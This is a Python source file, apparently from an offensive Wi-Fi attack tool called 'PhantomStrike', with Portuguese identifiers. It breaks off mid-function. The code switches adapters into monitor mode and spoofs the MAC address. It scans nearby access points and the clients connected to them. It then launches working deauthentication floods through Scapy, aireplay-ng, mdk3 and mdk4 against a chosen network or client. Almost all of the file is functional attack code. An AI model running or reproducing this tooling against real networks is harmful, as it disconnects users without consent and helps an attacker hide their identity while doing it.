# ============================================================
# CORES ANSI
# ============================================================
class Cores:
    RESET    = "\033[0m"
    VERMELHO = "\033[0;31m"
    VERDE    = "\033[0;32m"
    AMARELO  = "\033[1;33m"
    AZUL     = "\033[0;34m"
    MAGENTA  = "\033[0;35m"
    CIANO    = "\033[0;36m"
    BRANCO   = "\033[1;37m"
    NEGRITO  = "\033[1m"
    DIM      = "\033[2m"
    PISCAR   = "\033[1;35m"

C = Cores()

# ============================================================
# BANNER
# ============================================================
BANNER = f"""
{C.CIANO}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██████╗ ██╗   ██╗███████╗██╗   ██╗██████╗  ██████╗ ███╗   ██╗  ║
║   ██╔══██╗██║   ██║██╔════╝╚██╗ ██╔╝██╔══██╗██╔═══██╗████╗  ██║  ║
║   ██████╔╝██║   ██║███████╗ ╚████╔╝ ██████╔╝██║   ██║██╔██╗ ██║  ║
║   ██╔══██╗██║   ██║╚════██║  ╚██╔╝  ██╔══██╗██║   ██║██║╚██╗██║  ║
║   ██║  ██║╚██████╔╝███████║   ██║   ██████╔╝╚██████╔╝██║ ╚████║  ║
║   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝  ║
║                                                                  ║
║         {t('banner_title')}         ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║  {t('banner_subtitle'):<62} ║
║  {t('banner_copyright'):<62} ║
╚══════════════════════════════════════════════════════════════════╝
{C.RESET}
"""

# ============================================================
# FUNÇÕES UTILITÁRIAS
# ============================================================
def limpar_ecra():
    os.system("clear")

def entrada_segura(mensagem=""):
    try:
        with open('/dev/tty', 'r') as tty:
            tty.write(mensagem)
            tty.flush()
            return tty.readline().strip()
    except Exception:
        try:
            return input(mensagem)
        except Exception:
            return ""

def executar_comando(comando, timeout=30, capturar=True):
    try:
        if capturar:
            resultado = subprocess.run(comando, shell=True, capture_output=True, text=True, timeout=timeout)
            return resultado.stdout.strip(), resultado.returncode
        else:
            subprocess.run(comando, shell=True, timeout=timeout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "", 0
    except Exception:
        return "", 1

def executar_comando_live(comando, timeout=60):
    try:
        processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, preexec_fn=os.setsid)
        output = []
        for linha in processo.stdout:
            print(linha, end='')
            output.append(linha)
        processo.wait(timeout=timeout)
        return ''.join(output), processo.returncode
    except Exception as e:
        return str(e), 1

def verificar_root():
    return os.geteuid() == 0

def ferramenta_disponivel(nome):
    return shutil.which(nome) is not None

def obter_interfaces_wifi():
    output, _ = executar_comando("iw dev 2>/dev/null | awk '$1==\"Interface\"{print $2}'")
    if output:
        return [i for i in output.split("\n") if i.strip()]
    return ["wlan0"]

def obter_interface_padrao():
    interfaces = obter_interfaces_wifi()
    return interfaces[0] if interfaces else "wlan0"

def obter_mac_atual(interface):
    mac, _ = executar_comando(f"cat /sys/class/net/{interface}/address 2>/dev/null")
    return mac if mac else "Desconhecido"

def verificar_modo_monitor(interface):
    output, _ = executar_comando(f"iwconfig {interface} 2>/dev/null")
    return "Mode:Monitor" in output

def definir_modo_monitor(interface, ativar=True):
    if ativar:
        executar_comando("rfkill unblock all 2>/dev/null", capturar=False)
        executar_comando(f"airmon-ng start {interface} 2>/dev/null", capturar=False)
        output, _ = executar_comando("iw dev | awk '$1==\"Interface\"{print $2}' | grep mon")
        if output:
            return output.strip()
        executar_comando(f"iw dev {interface} interface add {interface}mon type monitor 2>/dev/null")
        executar_comando(f"ip link set {interface}mon up 2>/dev/null")
        return f"{interface}mon"
    else:
        interface_mon = f"{interface}mon"
        executar_comando(f"airmon-ng stop {interface_mon} 2>/dev/null", capturar=False)
        executar_comando(f"iw dev {interface_mon} del 2>/dev/null")
        executar_comando(f"ip link set {interface} up 2>/dev/null")
        return interface

def gerar_mac_aleatorio():
    mac = [0x02, 0x00, 0x00, random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def alterar_mac_aleatorio(interface):
    global MAC_ORIGINAL, MAC_SPOOFED
    if MAC_SPOOFED:
        print(f"{C.AMARELO}[!] {t('msg_mac_already_changed')}{C.RESET}")
        return
    MAC_ORIGINAL = obter_mac_atual(interface)
    if not MAC_ORIGINAL or MAC_ORIGINAL == "Desconhecido":
        print(f"{C.VERMELHO}[!] {t('msg_error_read_mac')}{C.RESET}")
        return
    print(f"{C.CIANO}[*] {t('msg_changing_mac')} {interface}...{C.RESET}")
    print(f"{C.DIM}    {t('msg_original_mac')}: {MAC_ORIGINAL}{C.RESET}")
    executar_comando(f"ip link set dev {interface} down 2>/dev/null")
    novo_mac = gerar_mac_aleatorio()
    output, rc = executar_comando(f"ip link set dev {interface} address {novo_mac} 2>/dev/null")
    executar_comando(f"ip link set dev {interface} up 2>/dev/null")
    if rc == 0:
        MAC_SPOOFED = True
        print(f"{C.VERDE}[+] {t('msg_mac_changed_success')}: {novo_mac}{C.RESET}")
    else:
        print(f"{C.VERMELHO}[!] {t('msg_mac_change_failed')}{C.RESET}")
        executar_comando(f"ip link set dev {interface} address {MAC_ORIGINAL} 2>/dev/null")
        MAC_ORIGINAL = None

def restaurar_mac_original(interface):
    global MAC_ORIGINAL, MAC_SPOOFED
    if not MAC_SPOOFED or not MAC_ORIGINAL:
        return
    print(f"{C.CIANO}[*] {t('msg_restoring_mac')} {interface}...{C.RESET}")
    executar_comando(f"ip link set dev {interface} down 2>/dev/null")
    executar_comando(f"ip link set dev {interface} address {MAC_ORIGINAL} 2>/dev/null")
    executar_comando(f"ip link set dev {interface} up 2>/dev/null")
    print(f"{C.VERDE}[+] {t('msg_mac_restored')}: {MAC_ORIGINAL}{C.RESET}")
    MAC_SPOOFED = False
    MAC_ORIGINAL = None

def restaurar_rede(interface):
    print(f"\n{C.CIANO}[*] {t('msg_restoring_network')} {interface}...{C.RESET}")
    restaurar_mac_original(interface)
    interface_mon = f"{interface}mon"
    executar_comando(f"airmon-ng stop {interface_mon} 2>/dev/null", capturar=False)
    executar_comando(f"iw dev {interface_mon} del 2>/dev/null")
    for processo in ["airmon-ng", "airodump-ng", "aireplay-ng", "mdk3", "mdk4"]:
        executar_comando(f"pkill -f {processo} 2>/dev/null")
    executar_comando(f"ip link set {interface} down 2>/dev/null")
    executar_comando(f"iw dev {interface} set type managed 2>/dev/null")
    executar_comando(f"ip link set {interface} up 2>/dev/null")
    executar_comando("systemctl restart NetworkManager 2>/dev/null", capturar=False)
    executar_comando(f"dhclient -r {interface} 2>/dev/null")
    executar_comando(f"dhclient {interface} 2>/dev/null", capturar=False)
    print(f"{C.VERDE}[+] {t('msg_interface_restored')} {interface} {t('msg_restored_managed')}{C.RESET}")

# ============================================================
# SELEÇÃO DE IDIOMA
# ============================================================
def selecionar_idioma():
    """Mostra menu de seleção de idioma."""
    global idioma_atual
    limpar_ecra()
    print(f"{C.CIANO}╔══════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CIANO}║         LANGUAGE / IDIOMA / 语言 / ЯЗЫК         ║{C.RESET}")
    print(f"{C.CIANO}╚══════════════════════════════════════════════════╝{C.RESET}\n")
    print(f"{C.AMARELO}{t('msg_select_language')}{C.RESET}\n")
    
    opcoes = list(IDIOMAS_DISPONIVEIS.keys())
    for idx, cod in enumerate(opcoes, 1):
        marcador = "✓" if cod == idioma_atual else " "
        print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}{idx}{C.RESET}{C.VERMELHO}]{C.RESET} {IDIOMAS_DISPONIVEIS[cod]}  {C.DIM}[{marcador}]{C.RESET}")
    
    print()
    escolha = entrada_segura(f"{C.AMARELO}> {C.RESET}")
    
    try:
        escolha_num = int(escolha)
        if 1 <= escolha_num <= len(opcoes):
            novo_idioma = opcoes[escolha_num - 1]
            idioma_atual = novo_idioma
            guardar_idioma(novo_idioma)
            print(f"\n{C.VERDE}[✓] {t('msg_language_changed')} {IDIOMAS_DISPONIVEIS[novo_idioma]}{C.RESET}")
        else:
            print(f"{C.VERMELHO}[!] {t('msg_invalid_language')}{C.RESET}")
    except ValueError:
        print(f"{C.VERMELHO}[!] {t('msg_invalid_language')}{C.RESET}")
    
    entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")

# ============================================================
# SCAPY
# ============================================================
SCAPY_DISPONIVEL = False
scapy_Dot11 = None
scapy_Dot11Deauth = None
scapy_RadioTap = None
scapy_sendp = None

def tentar_carregar_scapy():
    global SCAPY_DISPONIVEL, scapy_Dot11, scapy_Dot11Deauth, scapy_RadioTap, scapy_sendp
    if SCAPY_DISPONIVEL:
        return True
    try:
        from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
        from scapy.sendrecv import sendp
        scapy_Dot11 = Dot11
        scapy_Dot11Deauth = Dot11Deauth
        scapy_RadioTap = RadioTap
        scapy_sendp = sendp
        SCAPY_DISPONIVEL = True
        return True
    except Exception:
        return False

def verificar_ferramentas_deauth():
    return {
        "scapy": tentar_carregar_scapy(),
        "aireplay": ferramenta_disponivel("aireplay-ng"),
        "mdk3": ferramenta_disponivel("mdk3"),
        "mdk4": ferramenta_disponivel("mdk4")
    }

def mostrar_ferramentas_disponiveis():
    ferramentas = verificar_ferramentas_deauth()
    disponiveis = []
    indisponiveis = []
    for nome, estado in ferramentas.items():
        if estado:
            disponiveis.append(f"{C.VERDE}{nome}{C.RESET}")
        else:
            indisponiveis.append(f"{C.DIM}{nome}{C.RESET}")
    return ", ".join(disponiveis) + (" | " + ", ".join(indisponiveis) if indisponiveis else "")

# ============================================================
# CORES AUXILIARES
# ============================================================
def obter_cor_encriptacao(encriptacao):
    enc = encriptacao.upper()
    if "WPA3" in enc: return C.VERDE
    elif "WPA2" in enc: return C.AMARELO
    elif "WPA" in enc: return C.AMARELO
    elif "WEP" in enc: return C.VERMELHO
    elif "OPN" in enc or not enc: return C.CIANO
    else: return C.BRANCO

def obter_cor_potencia(potencia_str):
    try:
        potencia = int(potencia_str)
        if potencia > -50: return C.VERDE
        elif potencia > -70: return C.AMARELO
        else: return C.VERMELHO
    except (ValueError, TypeError):
        return C.BRANCO

def obter_cor_clientes(num_clientes):
    if num_clientes == 0: return C.DIM
    elif num_clientes <= 2: return C.CIANO
    else: return C.VERMELHO

# ============================================================
# SCAN ACCESS POINTS
# ============================================================
def scan_access_points(interface):
    limpar_ecra()
    print(f"{C.CIANO}[*] {t('msg_starting_scan')} {interface}...{C.RESET}")
    print(f"{C.DIM}    {t('msg_scan_update')}{C.RESET}")
    print(f"{C.AMARELO}    {t('msg_ctrlc_stop')}{C.RESET}\n")

    interface_mon = definir_modo_monitor(interface, ativar=True)
    if not interface_mon:
        print(f"{C.VERMELHO}[!] {t('msg_monitor_failed')}{C.RESET}")
        entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        return None

    print(f"{C.VERDE}[+] {t('msg_monitor_enabled')}: {interface_mon}{C.RESET}\n")

    base_csv = "/tmp/phantomstrike_scan"
    for ficheiro in glob.glob("/tmp/phantomstrike_scan*.csv"):
        os.remove(ficheiro)

    processo = subprocess.Popen(
        f"airodump-ng -w {base_csv} --output-format csv {interface_mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL, preexec_fn=os.setsid
    )

    handler_original = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal.default_int_handler)

    access_points = {}
    clientes_anterior = {}
    novos_clientes = {}

    try:
        while True:
            time.sleep(2)
            ficheiros_csv = sorted(glob.glob("/tmp/phantomstrike_scan*.csv"))
            csv_encontrado = ficheiros_csv[-1] if ficheiros_csv else None

            if csv_encontrado and os.path.exists(csv_encontrado):
                try:
                    with open(csv_encontrado, "r", encoding="utf-8", errors="ignore") as f:
                        linhas = f.readlines()
                    seccao_ap = False
                    seccao_clientes = False
                    aps_temp = {}
                    
                    for linha in linhas:
                        linha = linha.strip()
                        if not linha: continue
                        if linha.startswith("BSSID"):
                            seccao_ap = True; seccao_clientes = False; continue
                        if linha.startswith("Station MAC"):
                            seccao_ap = False; seccao_clientes = True; continue
                        
                        if seccao_ap:
                            partes = [p.strip() for p in linha.split(",")]
                            if len(partes) >= 14:
                                bssid = partes[0].strip().upper()
                                if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                                    essid = partes[13] if len(partes) > 13 else ""
                                    if "\\x00" in essid or not essid: essid = t('msg_hidden')
                                    if bssid not in aps_temp:
                                        aps_temp[bssid] = {"bssid": bssid, "canal": partes[3].strip(), "potencia": partes[8].strip(), "encriptacao": partes[5].strip(), "essid": essid[:25], "clientes": set()}
                                    else:
                                        aps_temp[bssid]["potencia"] = partes[8].strip()
                        elif seccao_clientes:
                            partes = [p.strip() for p in linha.split(",")]
                            if len(partes) >= 6:
                                mac_cliente = partes[0].strip().upper()
                                bssid_associado = partes[5].strip().upper()
                                if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac_cliente):
                                    if bssid_associado in aps_temp:
                                        aps_temp[bssid_associado]["clientes"].add(mac_cliente)
                    
                    novos_clientes = {}
                    for bssid, dados_ap in aps_temp.items():
                        count_atual = len(dados_ap["clientes"])
                        count_anterior = clientes_anterior.get(bssid, 0)
                        if count_atual > count_anterior: novos_clientes[bssid] = True
                        clientes_anterior[bssid] = count_atual
                    
                    access_points = {}
                    idx = 1
                    for bssid, dados in aps_temp.items():
                        access_points[idx] = dados
                        idx += 1
                except Exception:
                    pass

            limpar_ecra()
            print(f"{C.CIANO}[*] {t('msg_scan_running')}... (CTRL+C){C.RESET}\n")
            print(f"{C.NEGRITO}{'#':<4} {'BSSID':<18} {'CH':<4} {'PWR':<6} {'ENC':<10} {'CLI':<5} {'ESSID'}{C.RESET}")
            print(f"{C.DIM}{'─'*80}{C.RESET}")

            if access_points:
                for idx, ap in access_points.items():
                    num_clientes = len(ap["clientes"])
                    cor_enc = obter_cor_encriptacao(ap["encriptacao"])
                    cor_pwr = obter_cor_potencia(ap["potencia"])
                    cor_cli = obter_cor_clientes(num_clientes)
                    if ap["bssid"] in novos_clientes: cor_cli = C.PISCAR
                    cli_str = f"{C.NEGRITO}{num_clientes}{C.RESET}" if num_clientes > 0 else f"{C.DIM}0{C.RESET}"
                    linha = f"{C.BRANCO}{idx:<4} {C.DIM}{ap['bssid']:<18} {C.BRANCO}{ap['canal']:<4} {cor_pwr}{ap['potencia']:<6} {cor_enc}{ap['encriptacao'][:10]:<10} {cor_cli}{cli_str:<5} {C.BRANCO}{ap['essid']}{C.RESET}"
                    if ap["bssid"] in novos_clientes:
                        print(f"{C.PISCAR}▶ {linha} {t('msg_new_client')}{C.RESET}")
                    else:
                        print(f"  {linha}")
                print(f"\n{C.DIM}{'─'*80}{C.RESET}")
                print(f"{C.VERDE}[+] {len(access_points)} {t('msg_aps_detected')}.{C.RESET}")
                total_clientes = sum(len(ap["clientes"]) for ap in access_points.values())
                if total_clientes > 0:
                    print(f"{C.CIANO}    {t('msg_total_clients')}: {C.NEGRITO}{total_clientes}{C.RESET}")
            else:
                print(f"{C.AMARELO}[*] {t('msg_waiting_networks')}{C.RESET}")
                print(f"{C.DIM}    {t('msg_check_antenna')}{C.RESET}")
            print(f"\n{C.DIM}{t('msg_legend')}: {C.VERDE}WPA3 {C.AMARELO}WPA2 {C.VERMELHO}WEP/Open {C.CIANO}Clients {C.RESET}| {C.VERDE}Strong {C.AMARELO}mid {C.VERMELHO}weak{C.RESET}")

    except KeyboardInterrupt:
        print(f"\n\n{C.AMARELO}[*] {t('msg_scan_interrupted')}{C.RESET}")
    finally:
        signal.signal(signal.SIGINT, handler_original)
        processo.terminate()
        try: processo.wait(timeout=5)
        except Exception: processo.kill()
        definir_modo_monitor(interface, ativar=False)

    if not access_points:
        print(f"{C.AMARELO}[!] {t('msg_no_aps_found')}{C.RESET}")
        entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        return None

    limpar_ecra()
    print(f"{C.CIANO}[*] {t('msg_scan_concluded')}:{C.RESET}\n")
    print(f"{C.NEGRITO}{'#':<4} {'BSSID':<18} {'CH':<4} {'PWR':<6} {'ENC':<10} {'CLI':<5} {'ESSID'}{C.RESET}")
    print(f"{C.DIM}{'─'*80}{C.RESET}")
    for idx, ap in access_points.items():
        num_clientes = len(ap["clientes"])
        cor_enc = obter_cor_encriptacao(ap["encriptacao"])
        cor_pwr = obter_cor_potencia(ap["potencia"])
        cor_cli = obter_cor_clientes(num_clientes)
        cli_str = f"{C.NEGRITO}{num_clientes}{C.RESET}" if num_clientes > 0 else f"{C.DIM}0{C.RESET}"
        linha = f"{C.BRANCO}{idx:<4} {C.DIM}{ap['bssid']:<18} {C.BRANCO}{ap['canal']:<4} {cor_pwr}{ap['potencia']:<6} {cor_enc}{ap['encriptacao'][:10]:<10} {cor_cli}{cli_str:<5} {C.BRANCO}{ap['essid']}{C.RESET}"
        print(f"  {linha}")
    print(f"\n{C.DIM}{'─'*80}{C.RESET}")
    print(f"{C.VERDE}[+] {len(access_points)} {t('msg_aps_found')}.{C.RESET}")
    total_clientes = sum(len(ap["clientes"]) for ap in access_points.values())
    if total_clientes > 0:
        print(f"{C.CIANO}    {t('msg_total_clients')}: {C.NEGRITO}{total_clientes}{C.RESET}")
    return access_points

# ============================================================
# SCAN HOSTS
# ============================================================
def scan_hosts(interface):
    limpar_ecra()
    print(f"{C.CIANO}[*] {t('msg_searching_hosts')}{C.RESET}\n")
    output, _ = executar_comando(f"ip -4 addr show {interface} | grep -oP '(?<=inet\s)\d+(\.\d+){3}'")
    if not output:
        print(f"{C.VERMELHO}[!] {t('msg_error_get_ip')} {interface}.{C.RESET}")
        entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        return
    ip = output
    subnet = ".".join(ip.split(".")[:3]) + ".0/24"
    print(f"{C.AMARELO}    {t('msg_subnet_detected')}: {subnet}{C.RESET}\n")
    print(f"{C.CIANO}[*] {t('msg_using_arp_scan')}{C.RESET}")
    output, codigo = executar_comando(f"arp-scan -l --interface={interface} 2>/dev/null | grep -v 'packets' | grep -v '^$'")
    if codigo == 0 and output:
        linhas = output.split("\n")
        print(f"\n{C.VERDE}{'#':<4} {'IP':<16} {'MAC':<18} {t('msg_manufacturer')}{C.RESET}")
        print(f"{C.DIM}{'─'*60}{C.RESET}")
        idx = 0
        for linha in linhas:
            partes = linha.split("\t")
            if len(partes) >= 2 and ":" in partes[1]:
                idx += 1
                ip_addr = partes[0].strip()
                mac = partes[1].strip()
                fabricante = partes[2].strip() if len(partes) > 2 else t('msg_unknown')
                print(f"{C.BRANCO}{idx:<4} {ip_addr:<16} {mac:<18} {fabricante}{C.RESET}")
    else:
        print(f"{C.AMARELO}[!] {t('msg_arp_unavailable')}{C.RESET}")
        output, _ = executar_comando(f"nmap -sn {subnet} 2>/dev/null | grep -B1 'Host is up'")
        if output: print(output)
        else: print(f"{C.VERMELHO}[!] {t('msg_no_hosts_found')}{C.RESET}")
    entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")

# ============================================================
# MÉTODOS DE DEAUTH
# ============================================================
def selecionar_metodo_deauth():
    ferramentas = verificar_ferramentas_deauth()
    limpar_ecra()
    print(f"{C.CIANO}╔══════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CIANO}║     {t('method_select_title'):<41} ║{C.RESET}")
    print(f"{C.CIANO}╚══════════════════════════════════════════════════╝{C.RESET}\n")
    opcoes = []
    idx = 1
    if ferramentas["scapy"]:
        print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}{idx}{C.RESET}{C.VERMELHO}]{C.RESET} {C.VERDE}Scapy{C.RESET} - {t('method_scapy').split(' - ')[1] if ' - ' in t('method_scapy') else ''}")
        opcoes.append("scapy"); idx += 1
    if ferramentas["aireplay"]:
        print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}{idx}{C.RESET}{C.VERMELHO}]{C.RESET} {C.VERDE}aireplay-ng{C.RESET}")
        opcoes.append("aireplay"); idx += 1
    if ferramentas["mdk3"]:
        print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}{idx}{C.RESET}{C.VERMELHO}]{C.RESET} {C.VERDE}mdk3{C.RESET}")
        opcoes.append("mdk3"); idx += 1
    if ferramentas["mdk4"]:
        print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}{idx}{C.RESET}{C.VERMELHO}]{C.RESET} {C.VERDE}mdk4{C.RESET} ({t('method_mdk4').split('(')[1].rstrip(')') if '(' in t('method_mdk4') else ''})")
        opcoes.append("mdk4"); idx += 1
    if not opcoes:
        print(f"\n{C.VERMELHO}[!] {t('msg_no_deauth_tools')}{C.RESET}")
        entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        return None
    print(f"\n{C.DIM}{'─'*55}{C.RESET}")
    print(f"{C.DIM}  {t('menu_tools')}: {mostrar_ferramentas_disponiveis()}{C.RESET}")
    print(f"{C.DIM}{'─'*55}{C.RESET}\n")
    escolha = entrada_segura(f"{C.AMARELO}{t('msg_select_method')} [1-{len(opcoes)}]: {C.RESET}")
    try:
        escolha_num = int(escolha)
        if 1 <= escolha_num <= len(opcoes):
            metodo = opcoes[escolha_num - 1]
            print(f"\n{C.VERDE}[+] {t('msg_method_selected')}: {metodo}{C.RESET}")
            return metodo
        else:
            print(f"{C.VERMELHO}[!] {t('msg_using_default_method')}{C.RESET}")
            return opcoes[0]
    except ValueError:
        print(f"{C.VERMELHO}[!] {t('msg_using_default_method')}{C.RESET}")
        return opcoes[0]

def deauth_scapy_com_feedback(interface_mon, bssid_alvo, mac_cliente="ff:ff:ff:ff:ff:ff", quantidade=128):
    print(f"\n{C.CIANO}╔══════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CIANO}║     {t('attack_scapy_title'):<41} ║{C.RESET}")
    print(f"{C.CIANO}╚══════════════════════════════════════════════════╝{C.RESET}\n")
    print(f"{C.AMARELO}[*] {t('msg_target_bssid')}: {C.BRANCO}{bssid_alvo}{C.RESET}")
    print(f"{C.AMARELO}[*] {t('msg_client_mac')}: {C.BRANCO}{mac_cliente}{C.RESET}")
    print(f"{C.AMARELO}[*] {t('msg_packets_to_send')}: {C.BRANCO}{quantidade}{C.RESET}\n")
    try:
        radio = scapy_RadioTap()
        dot11 = scapy_Dot11(type=0, subtype=12, addr1=mac_cliente, addr2=bssid_alvo, addr3=bssid_alvo)
        deauth = scapy_Dot11Deauth(reason=7)
        pacote = radio / dot11 / deauth
        enviados = 0
        print(f"{C.DIM}{'─'*55}{C.RESET}")
        print(f"{C.DIM}  {t('msg_sending_packets')}{C.RESET}")
        print(f"{C.DIM}{'─'*55}{C.RESET}\n")
        for i in range(quantidade):
            try:
                scapy_sendp(pacote, iface=interface_mon, verbose=False, count=1)
                enviados += 1
                if enviados % 5 == 0:
                    print(f"  {C.VERDE}[✓]{C.RESET} {t('msg_packet_sent')} #{enviados}/{quantidade} {t('msg_sent_to')} {C.CIANO}{mac_cliente}{C.RESET}")
            except Exception as e:
                print(f"  {C.VERMELHO}[✗]{C.RESET} {t('msg_error_sending_packet')} #{enviados + 1}: {e}")
            time.sleep(0.02)
        print(f"\n{C.DIM}{'─'*55}{C.RESET}")
        print(f"{C.VERDE}[+] {t('msg_total_packets_sent')}: {enviados} {t('msg_packets_sent_success')}{C.RESET}")
        print(f"{C.DIM}{'─'*55}{C.RESET}\n")
        return True
    except Exception as e:
        print(f"{C.VERMELHO}[!] {t('msg_fatal_error_scapy')}: {e}{C.RESET}")
        return False

def deauth_aireplay_com_feedback(interface_mon, bssid_alvo, mac_cliente="ff:ff:ff:ff:ff:ff", quantidade=128):
    print(f"\n{C.CIANO}╔══════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CIANO}║     {t('attack_aireplay_title'):<41} ║{C.RESET}")
    print(f"{C.CIANO}╚══════════════════════════════════════════════════╝{C.RESET}\n")
    print(f"{C.AMARELO}[*] {t('msg_target_bssid')}: {C.BRANCO}{bssid_alvo}{C.RESET}")
    print(f"{C.AMARELO}[*] {t('msg_client_mac')}: {C.BRANCO}{mac_cliente}{C.RESET}")
    print(f"{C.AMARELO}[*] {t('msg_packets_to_send')}: {C.BRANCO}{quantidade}{C.RESET}\n")
    comando = f"aireplay-ng --deauth {quantidade} -a {bssid_alvo} {interface_mon}"
    if mac_cliente != "ff:ff:ff:ff:ff:ff":
        comando += f" -c {mac_cliente}"
    print(f"{C.DIM}[*] {t('msg_running_command')}: {comando}{C.RESET}\n")
    print(f"{C.DIM}{'─'*55}{C.RESET}\n")
    output, codigo = executar_comando_live(comando, timeout=quantidade + 30)
    print(f"\n{C.DIM}{'─'*55}{C.RESET}")
    if codigo == 0 or "ACK" in output or "sent" in output.lower():
        print(f"{C.VERDE}[+] {t('msg_attack_concluded_aireplay')}{C.RESET}")
    else:
        print(f"{C.AMARELO}[!] {t('msg_aireplay_exit_code')} {codigo}.{C.RESET}")
    print(f"{C.DIM}{'─'*55}{C.RESET}\n")
    return True

def deauth_mdk3_com_feedback(interface_mon, bssid_alvo, duracao=30):
    print(f"\n{C.CIANO}╔══════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CIANO}║     {t('attack_mdk3_title'):<41} ║{C.RESET}")
    print(f"{C.CIANO}╚══════════════════════════════════════════════════╝{C.RESET}\n")
    print(f"{C.AMARELO}[*] {t('msg_target_bssid')}: {C.BRANCO}{bssid_alvo}{C.RESET}")
    print(f"{C.AMARELO}[*] {t('msg_duration')}: {C.BRANCO}{duracao} {t('msg_seconds')}{C.RESET}")
    print(f"{C.VERMELHO}[!] {t('msg_mdk3_warning')}{C.RESET}\n")
    ficheiro_targets = "/tmp/phantomstrike_targets.txt"
    with open(ficheiro_targets, "w") as f:
        f.write(f"{bssid_alvo}\n")
    comando = f"mdk3 {interface_mon} d -c {ficheiro_targets}"
    print(f"{C.DIM}[*] {t('msg_running_command')}: {comando}{C.RESET}\n")
    print(f"{C.DIM}{'─'*55}{C.RESET}\n")
    try:
        processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, preexec_fn=os.setsid)
        inicio = time.time()
        while (time.time() - inicio) < duracao:
            tempo_restante = int(duracao - (time.time() - inicio))
            print(f"  {C.VERDE}[✓]{C.RESET} MDK3 {t('msg_mdk_attacking_remaining')} {C.AMARELO}{tempo_restante}s{C.RESET} {t('msg_remaining')}", end="\r")
            time.sleep(1)
        os.killpg(os.getpgid(processo.pid), signal.SIGTERM)
        processo.wait(timeout=5)
        print(f"\n\n{C.DIM}{'─'*55}{C.RESET}")
        print(f"{C.VERDE}[+] {t('msg_mdk_concluded')} mdk3 {t('msg_concluded_after')} {duracao} {t('msg_seconds')}!{C.RESET}")
        print(f"{C.DIM}{'─'*55}{C.RESET}\n")
        return True
    except Exception as e:
        print(f"\n{C.VERMELHO}[!] {t('msg_error_mdk')} mdk3: {e}{C.RESET}")
        return False
    finally:
        if os.path.exists(ficheiro_targets):
            os.remove(ficheiro_targets)

def deauth_mdk4_com_feedback(interface_mon, bssid_alvo, duracao=30):
    print(f"\n{C.CIANO}╔══════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CIANO}║     {t('attack_mdk4_title'):<41} ║{C.RESET}")
    print(f"{C.CIANO}╚══════════════════════════════════════════════════╝{C.RESET}\n")
    print(f"{C.AMARELO}[*] {t('msg_target_bssid')}: {C.BRANCO}{bssid_alvo}{C.RESET}")
    print(f"{C.AMARELO}[*] {t('msg_duration')}: {C.BRANCO}{duracao} {t('msg_seconds')}{C.RESET}\n")
    comando = f"mdk4 {interface_mon} D -c {bssid_alvo}"
    print(f"{C.DIM}[*] {t('msg_running_command')}: {comando}{C.RESET}\n")
    print(f"{C.DIM}{'─'*55}{C.RESET}\n")
    try:
        processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, preexec_fn=os.setsid)
        inicio = time.time()
        while (time.time() - inicio) < duracao:
            tempo_restante = int(duracao - (time.time() - inicio))
            print(f"  {C.VERDE}[✓]{C.RESET} MDK4 {t('msg_mdk_attacking_remaining')} {C.AMARELO}{tempo_restante}s{C.RESET} {t('msg_remaining')}", end="\r")
            time.sleep(1)
        os.killpg(os.getpgid(processo.pid), signal.SIGTERM)
        processo.wait(timeout=5)
        print(f"\n\n{C.DIM}{'─'*55}{C.RESET}")
        print(f"{C.VERDE}[+] {t('msg_mdk_concluded')} mdk4 {t('msg_concluded_after')} {duracao} {t('msg_seconds')}!{C.RESET}")
        print(f"{C.DIM}{'─'*55}{C.RESET}\n")
        return True
    except Exception as e:
        print(f"\n{C.VERMELHO}[!] {t('msg_error_mdk')} mdk4: {e}{C.RESET}")
        return False

def enviar_pacotes_deauth_com_feedback(interface_mon, bssid_alvo, mac_cliente="ff:ff:ff:ff:ff:ff", quantidade=128, metodo=None, duracao=30):
    if metodo is None:
        metodo = selecionar_metodo_deauth()
    if metodo is None:
        print(f"{C.VERMELHO}[!] {t('msg_no_deauth_method')}{C.RESET}")
        return False
    if metodo == "scapy":
        return deauth_scapy_com_feedback(interface_mon, bssid_alvo, mac_cliente, quantidade)
    elif metodo == "aireplay":
        return deauth_aireplay_com_feedback(interface_mon, bssid_alvo, mac_cliente, quantidade)
    elif metodo == "mdk3":
        return deauth_mdk3_com_feedback(interface_mon, bssid_alvo, duracao)
    elif metodo == "mdk4":
        return deauth_mdk4_com_feedback(interface_mon, bssid_alvo, duracao)
    else:
